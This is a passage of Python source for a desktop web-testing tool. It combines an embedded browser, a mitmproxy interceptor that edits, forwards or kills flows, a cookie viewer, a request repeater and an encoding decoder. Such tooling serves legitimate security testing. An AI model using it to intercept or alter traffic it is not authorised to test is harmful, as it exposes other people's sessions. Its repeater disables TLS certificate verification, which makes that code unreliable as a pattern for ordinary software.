                first_line = lines[0].strip().split()
                if len(first_line) >= 2:
                    try:
                        flow.response.status_code = int(first_line[1])
                    except:
                        pass
                headers = {}
                body_start = 0
                for i, line in enumerate(lines[1:], 1):
                    if line.strip() == '':
                        body_start = i + 1
                        break
                    if ':' in line:
                        key, value = line.split(':', 1)
                        headers[key.strip()] = value.strip()
                flow.response.headers.clear()
                for k, v in headers.items(): flow.response.headers[k] = v
                body = '\n'.join(lines[body_start:])
                flow.response.content = body.encode('utf-8', errors='replace')
        except Exception as e:
            print("[-] Error updating flow content:", e)

    def forward_flow(self):
        item = self.intercept_list.currentItem()
        if not item: return
        fid = item.data(Qt.UserRole)
        flow = self.flow_data.get(fid)
        if not flow: return
        self.apply_edits_to_flow(flow)
        global addon
        if addon and addon.master: addon.master.commands.call("flow.resume", [flow])
        row = self.intercept_list.row(item)
        self.intercept_list.takeItem(row)
        self.flow_items.pop(fid, None)
        self.flow_data.pop(fid, None)

    def drop_flow(self):
        item = self.intercept_list.currentItem()
        if not item: return
        fid = item.data(Qt.UserRole)
        flow = self.flow_data.get(fid)
        if flow:
            global addon
            if addon and addon.master: addon.master.commands.call("flow.kill", [flow])
        row = self.intercept_list.row(item)
        self.intercept_list.takeItem(row)
        self.flow_items.pop(fid, None)
        self.flow_data.pop(fid, None)

    def navigate_to_url(self):
        url = self.url_bar.text().strip()
        if not url: return
        if not url.startswith(('http://', 'https://')): url = 'http://' + url
        self.browser.setUrl(QUrl(url))

    def refresh_cookies(self):
        self.cookie_table.setRowCount(0)
        self.temp_cookies = []
        self.cookie_store.cookieAdded.connect(self._on_cookie_added_temp)
        self.cookie_store.loadAllCookies()
        QTimer.singleShot(600, self._display_collected_cookies)

    def _on_cookie_added_temp(self, cookie):
        if cookie not in self.temp_cookies: self.temp_cookies.append(cookie)

    def _display_collected_cookies(self):
        try:
            self.cookie_store.cookieAdded.disconnect(self._on_cookie_added_temp)
        except:
            pass
        self.cookie_table.setRowCount(len(self.temp_cookies))
        for i, cookie in enumerate(self.temp_cookies):
            self.cookie_table.setItem(i, 0, QTableWidgetItem(cookie.domain()))
            self.cookie_table.setItem(i, 1, QTableWidgetItem(cookie.name().data().decode(errors='ignore')))
            self.cookie_table.setItem(i, 2, QTableWidgetItem(cookie.value().data().decode(errors='ignore')))
            self.cookie_table.setItem(i, 3, QTableWidgetItem(cookie.path()))
            self.cookie_table.setItem(i, 4, QTableWidgetItem(str(cookie.isSecure())))
            self.cookie_table.setItem(i, 5, QTableWidgetItem(str(cookie.isHttpOnly())))
            self.cookie_table.setItem(i, 6, QTableWidgetItem(
                cookie.expires().toString() if not cookie.isSessionCookie() else "Session"))

    def send_repeater(self):
        raw = self.repeater_request.toPlainText()
        if not raw.strip(): return
        lines = raw.splitlines()
        if not lines: return
        request_line = lines[0].strip().split()
        if len(request_line) < 2: return
        method, path = request_line[0], request_line[1]
        headers = {}
        body_start = 0
        for i, line in enumerate(lines[1:], 1):
            if line.strip() == '':
                body_start = i + 1
                break
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip()] = v.strip()
        body = '\n'.join(lines[body_start:])
        host = headers.get('Host', '')
        if not host: return
        scheme = 'https' if (':443' in host or 'https' in path or method == 'CONNECT') else 'http'
        url = path if path.startswith('http') else f"{scheme}://{host}{path}"
        try:
            proxies = {}
            if self.repeater_use_proxy.isChecked():
                proxies = {'http': f'http://{self.proxy_host}:{self.proxy_port}',
                           'https': f'http://{self.proxy_host}:{self.proxy_port}'}
            resp = requests.request(method, url, headers=headers,
                                    data=body.encode('utf-8', errors='replace') if body else None, proxies=proxies,
                                    verify=False, timeout=12)
            resp_text = f"HTTP/1.1 {resp.status_code} {resp.reason}\r\n"
            for k, v in resp.headers.items(): resp_text += f"{k}: {v}\r\n"
            resp_text += "\r\n" + resp.text
            self.repeater_response.setPlainText(resp_text)
        except Exception as e:
            self.repeater_response.setPlainText(f"[-] Request Failed:\n{str(e)}")

    def on_decoder_apply(self):
        text = self.dec_input.toPlainText()
        if not text: return
        op_index = self.dec_operation.currentIndex()
        try:
            if op_index == 0:
                res = base64.b64encode(text.encode()).decode()
            elif op_index == 1:
                res = base64.b64decode(text.encode()).decode()
            elif op_index == 2:
                res = urllib.parse.quote(text)
            elif op_index == 3:
                res = urllib.parse.unquote(text)
            elif op_index == 4:
                res = text.encode().hex()
            elif op_index == 5:
                res = bytes.fromhex(text).decode()
            self.dec_output.setPlainText(res)
        except Exception as e:
            self.dec_output.setPlainText(f"Error:\n{str(e)}")

    def closeEvent(self, event):
        global addon
        if addon and addon.master:
            try:
                addon.master.shutdown()
            except:
                pass
        event.accept()


if __name__ == '__main__':
    app = QApplication(sys.argv)
    proxy_thread = threading.Thread(target=start_proxy, daemon=True)
    proxy_thread.start()
    time.sleep(1.5)
    window = BrowserWindow()
    window.show()
    sys.exit(app.exec_())